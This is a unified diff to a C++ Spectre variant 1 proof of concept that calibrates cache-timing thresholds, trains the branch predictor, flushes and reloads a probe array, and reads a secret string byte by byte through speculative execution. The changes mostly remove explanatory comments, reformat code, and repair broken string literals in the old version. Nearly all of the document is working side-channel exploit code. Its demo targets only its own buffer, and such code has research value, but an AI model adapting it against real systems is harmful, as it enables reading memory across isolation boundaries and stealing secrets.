@@ -52,14 +52,13 @@ std::uint64_t calibrate_threshold() {
     volatile std::uint8_t* probe = &array2[0];
 
     for (int i = 0; i < kCalibrationSamples; ++i) {
-        // Hot sample.
         temp ^= *probe;
+
         const std::uint64_t hit_start = Timer::read_tsc_start();
         temp ^= *probe;
         const std::uint64_t hit_end = Timer::read_tsc_end();
         hits.push_back(hit_end - hit_start);
 
-        // Cold sample.
         Timer::clflush(probe);
         Timer::clflush_fence();
 
@@ -77,12 +76,10 @@ std::uint64_t calibrate_threshold() {
     const auto miss_median =
         static_cast<std::uint64_t>(miss.median);
 
-    // Prefer a midpoint only when the two distributions are separated.
     if (miss_median > hit_p99 + 10) {
         return (hit_p99 + miss_median) / 2;
     }
 
-    // Otherwise choose a conservative threshold above the hot-tail.
     return hit_p99 + 20;
 }
 
@@ -94,21 +91,17 @@ void victim_function(std::size_t x) {
         const std::size_t value =
             static_cast<std::size_t>(array1[x]);
 
-        // Keep the data-dependent access observable.
         temp &= array2[value * kProbeStride];
     }
 }
 
 void train_and_attack(std::size_t malicious_x,
                       int attempt) {
-    // Regular training index variation avoids teaching the predictor only
-    // one single source value.
     const std::size_t training_x =
         static_cast<std::size_t>(attempt) %
         kArchitecturalArraySize;
 
     for (int j = 0; j < kTrainingIterations; ++j) {
-        // Make the bounds load slow enough to create a speculative window.
         Timer::clflush(&array1_size);
         Timer::clflush_fence();
 
@@ -116,7 +109,8 @@ void train_and_attack(std::size_t malicious_x,
         }
 
         const bool attack_slot =
-            (j % kTrainingEvery) == (kTrainingEvery - 1);
+            (j % kTrainingEvery) ==
+            (kTrainingEvery - 1);
 
         const std::size_t x =
             attack_slot ? malicious_x : training_x;
@@ -125,15 +119,9 @@ void train_and_attack(std::size_t malicious_x,
     }
 }
 
-int score_reload(CandidateScores& scores,
-                 std::uint64_t threshold,
-                 int& lowest_hit_count) {
-    int local_hits = 0;
-    lowest_hit_count = 0;
-
+void score_reload(CandidateScores& scores,
+                  std::uint64_t threshold) {
     for (int i = 0; i < kProbeValues; ++i) {
-        // Mix probe order to reduce the chance that a regular stride
-        // dominates the timing through hardware prefetching.
         const int mixed =
             ((i * 167) + 13) & 255;
 
@@ -148,16 +136,14 @@ int score_reload(CandidateScores& scores,
 
         if (t1 - t0 <= threshold) {
             ++scores.score[static_cast<std::size_t>(mixed)];
-            ++local_hits;
         }
     }
-
-    return local_hits;
 }
 
-SpectreResult analyze_scores(const CandidateScores& scores,
-                             std::uint64_t threshold,
-                             int attempts) {
+SpectreResult analyze_scores(
+    const CandidateScores& scores,
+    std::uint64_t threshold,
+    int attempts) {
     int best = 0;
     int second = 0;
 
@@ -165,11 +151,13 @@ SpectreResult analyze_scores(const CandidateScores& scores,
         const int value =
             scores.score[static_cast<std::size_t>(i)];
 
-        if (value > scores.score[static_cast<std::size_t>(best)]) {
+        if (value > scores.score[
+                static_cast<std::size_t>(best)]) {
             second = best;
             best = i;
         } else if (i != best &&
-                   value > scores.score[static_cast<std::size_t>(second)]) {
+                   value > scores.score[
+                       static_cast<std::size_t>(second)]) {
             second = i;
         }
     }
@@ -179,11 +167,15 @@ SpectreResult analyze_scores(const CandidateScores& scores,
     const int second_score =
         scores.score[static_cast<std::size_t>(second)];
 
-    const int gap = best_score - second_score;
+    const int gap =
+        best_score - second_score;
+
     const double confidence =
         attempts > 0
-            ? static_cast<double>(gap) /
-              static_cast<double>(attempts)
+            ? std::max(
+                0.0,
+                static_cast<double>(gap) /
+                static_cast<double>(attempts))
             : 0.0;
 
     SpectreResult result;
@@ -192,18 +184,18 @@ SpectreResult analyze_scores(const CandidateScores& scores,
     result.score = best_score;
     result.second_score = second_score;
     result.threshold_cycles = threshold;
-    result.confidence = std::max(0.0, confidence);
+    result.confidence = confidence;
     result.attempts = attempts;
 
-    // This is intentionally stricter than the old rule: a useful result
-    // needs both separation from the runner-up and a minimum hit rate.
     const bool separated =
         best_score >= (2 * second_score + 5);
 
     const bool enough_evidence =
         best_score >= std::max(5, attempts / 40);
 
-    result.success = separated && enough_evidence;
+    result.success =
+        separated && enough_evidence;
+
     return result;
 }
 
@@ -214,21 +206,25 @@ SpectreResult read_byte_with_threshold(
     CandidateScores scores;
 
     for (int attempt = 0; attempt < tries; ++attempt) {
-        // Flush only the probe array. The victim bound is flushed
-        // independently during predictor training.
         for (int i = 0; i < kProbeValues; ++i) {
             Timer::clflush(
-                &array2[static_cast<std::size_t>(i) * kProbeStride]);
+                &array2[
+                    static_cast<std::size_t>(i) *
+                    kProbeStride]);
         }
         Timer::clflush_fence();
 
-        train_and_attack(malicious_x, attempt);
+        train_and_attack(
+            malicious_x,
+            attempt);
 
-        int local_hits = 0;
-        (void)score_reload(scores, threshold, local_hits);
+        score_reload(scores, threshold);
     }
 
-    return analyze_scores(scores, threshold, tries);
+    return analyze_scores(
+        scores,
+        threshold,
+        tries);
 }
 
 SpectreResult retry_if_uncertain(
@@ -237,22 +233,26 @@ SpectreResult retry_if_uncertain(
     std::uint64_t threshold) {
     SpectreResult first =
         read_byte_with_threshold(
-            malicious_x, tries, threshold);
+            malicious_x,
+            tries,
+            threshold);
 
     if (first.success) {
         return first;
     }
 
-    // Adaptive second pass for noisy bytes. This remains confined to the
-    // demo's own secret buffer.
     const int retry_tries =
         std::min(tries * 3, 5000);
 
     SpectreResult second =
         read_byte_with_threshold(
-            malicious_x, retry_tries, threshold);
+            malicious_x,
+            retry_tries,
+            threshold);
 
-    return second.score > first.score ? second : first;
+    return second.score > first.score
+        ? second
+        : first;
 }
 
 } // namespace
@@ -309,9 +309,10 @@ std::string SpectreV1::read_string(
             << " score=" << value.score
             << " second=" << value.second_score
             << " confidence=" << value.confidence
-            << (value.success ? " OK" : " uncertain")
-            << '
-';
+            << (value.success
+                    ? " OK"
+                    : " uncertain")
+            << '\n';
     }
 
     return result;
@@ -319,14 +320,14 @@ std::string SpectreV1::read_string(
 
 void SpectreV1::run_demo(int tries) {
     if (tries <= 0) {
-        std::cerr << "Spectre tries must be positive.
-";
+        std::cerr
+            << "Spectre tries must be positive.\n";
         return;
     }
 
-    // Training entries are deliberately non-zero so array2[0] does not
-    // become the dominant cache signal on every training iteration.
-    for (std::size_t i = 0; i < kArchitecturalArraySize; ++i) {
+    for (std::size_t i = 0;
+         i < kArchitecturalArraySize;
+         ++i) {
         array1[i] =
             static_cast<std::uint8_t>((i + 1) & 0xFFU);
     }
@@ -336,14 +337,17 @@ void SpectreV1::run_demo(int tries) {
         kSecret,
         sizeof(kSecret));
 
-    // Warm and then flush the probe array once before starting.
     for (int i = 0; i < kProbeValues; ++i) {
         temp ^= array2[
-            static_cast<std::size_t>(i) * kProbeStride];
+            static_cast<std::size_t>(i) *
+            kProbeStride];
     }
+
     for (int i = 0; i < kProbeValues; ++i) {
         Timer::clflush(
-            &array2[static_cast<std::size_t>(i) * kProbeStride]);
+            &array2[
+                static_cast<std::size_t>(i) *
+                kProbeStride]);
     }
     Timer::clflush_fence();
 
@@ -353,13 +357,9 @@ void SpectreV1::run_demo(int tries) {
         sizeof(kSecret) - 1;
 
     std::cout
-        << "Spectre V1 self-contained demo
-"
-        << "tries/byte: " << tries << "
-"
-        << "secret length: " << secret_length << "
-
-";
+        << "Spectre V1 self-contained demo\n"
+        << "tries/byte: " << tries << '\n'
+        << "secret length: " << secret_length << "\n\n";
 
     const std::string leaked =
         read_string(
@@ -368,17 +368,11 @@ void SpectreV1::run_demo(int tries) {
             tries);
 
     std::cout
-        << "
-========== Spectre V1 Demo ==========
-"
-        << "Leaked  : "" << leaked << ""
-"
-        << "Original: "" << kSecret << ""
-"
+        << "\n========== Spectre V1 Demo ==========\n"
+        << "Leaked  : \"" << leaked << "\"\n"
+        << "Original: \"" << kSecret << "\"\n"
         << "Match   : "
         << (leaked == kSecret ? "YES" : "NO")
-        << '
-'
-        << "=====================================
-";
+        << '\n'
+        << "=====================================\n";
 }
